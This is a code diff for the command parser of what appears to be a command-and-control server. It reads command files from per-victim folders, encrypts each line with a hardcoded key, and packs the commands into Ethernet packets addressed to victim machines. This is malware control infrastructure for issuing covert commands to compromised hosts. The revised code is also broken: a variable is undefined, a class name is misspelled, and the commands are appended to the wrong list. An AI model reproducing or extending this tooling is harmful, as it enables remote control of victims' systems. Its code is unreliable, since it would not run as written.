@@ -11,42 +11,33 @@ import time
 
 class CommandParser():
 
-    def __init__(self, directory, command_file):
+    def parse(self, victim_mac, command_file, victim_pkt):
+        """Parses the input file in the input directory of victim and builds packet for command
         
-        self.dir = directory
-        self.command_file = command_file
-        self.victim_dirs = []
-
-    def parse(self):
-        """Watch subdirectories for commands to send to the victims
+        Returns:
+            Ether[] -- list of packets that contain command data
         """
-        # if self.can_watch:
-        #     Timer(3, self._watch).start()
 
-        # Refresh victim dirs
-        self.victim_dirs = self._get_victim_dirs()
+        # Read corresponding folder for input file
+        pkts = []
+        path = dir + '/input/' + command_file
+        if os.path.isfile(path):
+            bundler = Bunder(victim_pkt)
 
-        # Iterate over directories and read command file
-        print('called')
-        for dir in self.victim_dirs:
-            if os.path.isfile(dir + '/input/' + self.command_file):
-                bundler = Bundler() # TODO: Pass in victim packet
-                with open(dir + '/input/' + self.command_file, 'r') as f:
-                    commands = []
-                    for line in f:
-                        # Encrypt the commands
-                        line = line.replace('\n', '')
-                        commands.append(Encrypter(line, 'secret').encrypt())
+            # Open file contents, encrypt, and build response packet
+            with open(path) as f:
+                parsed_commands = []
 
-                    # Prepare for transmission
-                    for cmd in commands:
-                        pkt = bundler.build_command_pkt(cmd)
+                for line in f:
+                    line = line.replace('\n', '')
+                    commands.append(Encrypter(line, 'secret').encrypt())
 
-                        # Send the packet
-
-                # os.remove(dir + '/input/' + self.command_file) # Done reading file
-
-        time.sleep(1000)
+                for cmd in parsed_commands:
+                    pkt = bundler.build_command_pkt(cmd)
+                    pkts.append(pkt)
+        
+        os.remove(path) # Done reading file
+        return pkts
 
     def _get_victim_dirs(self):
         """Get corresponding victims that connected to the server
